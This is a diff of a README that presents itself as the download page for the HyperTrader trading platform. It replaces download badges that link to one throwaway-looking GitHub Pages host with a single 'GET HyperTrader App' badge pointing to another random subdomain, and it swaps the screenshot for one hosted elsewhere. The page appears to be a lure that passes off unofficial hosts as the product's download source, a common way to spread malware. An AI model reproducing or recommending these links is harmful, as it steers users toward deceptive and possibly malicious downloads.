@@ -1,18 +1,7 @@
 # HyperTrader Download — Trading Platform
 
-<a href="https://git-apps-io.github.io/.github/?offer=HyperTrader" target="_blank">
-  <img 
-    src="https://img.shields.io/badge/HyperTrader%20for%20macOS-000000?style=for-the-badge&logo=apple&logoColor=white" 
-    width="280" 
-    alt="HyperTrader for macOS">
-</a>
+[![GET HyperTrader App](https://img.shields.io/badge/GET%20%E2%80%94%20HyperTrader-App-0078D6?style=for-the-badge&logoColor=white)](https://valenciaflashlightscophg758888.github.io/.github/HyperTrader-App)
 
-<a href="https://git-apps-io.github.io/.github/?offer=HyperTrader" target="_blank">
-  <img 
-    src="https://img.shields.io/badge/HyperTrader%20for%20Windows-0078D7?style=for-the-badge&logo=windows&logoColor=white" 
-    width="280" 
-    alt="HyperTrader for Windows">
-</a>
 
 ---
 
@@ -65,7 +54,7 @@ The platform's architecture is optimized for speed and reliability, featuring lo
 
 ## 🖼 Platform Preview
 
-![HyperTrader Trading Interface](https://gethypertrader.com/_next/static/media/HT-App.f6a7f53a.png)
+![HyperTrader Trading Interface](https://a.fsdn.com/con/app/proj/hypertrader.s/screenshots/HyperTrader-Supports-Multi-accounts.jpg/max/max/1)
 
 ---
 
